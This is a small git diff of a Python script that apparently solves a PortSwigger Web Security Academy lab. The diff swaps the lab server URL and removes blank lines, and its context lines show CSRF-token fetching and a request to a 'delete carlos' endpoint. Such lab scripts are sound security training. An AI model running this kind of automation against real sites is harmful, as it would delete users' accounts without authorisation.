@@ -4,7 +4,7 @@ import requests
 from rich.console import Console
 
 session = requests.Session()
-SERVER = "https://0a2600dd04182d5881dbb1b800a600e3.web-security-academy.net"
+SERVER = "https://0a4b007303fced9782a238ac00750030.web-security-academy.net"
 
 def get_csrf_token(endpoint):
     page = session.get(f"{SERVER}/{endpoint}")
@@ -65,8 +65,6 @@ def main():
     console.log(f"[magenta]Delete carlos endpoint[/magenta]: {delete_carlos_endpoint}")
     delete_response = session.get(f"{SERVER}{delete_carlos_endpoint}")
     console.log(f"[magenta]Delete response[/magenta]: {delete_response.status_code}")
-
-
 
 
 if __name__ == "__main__":
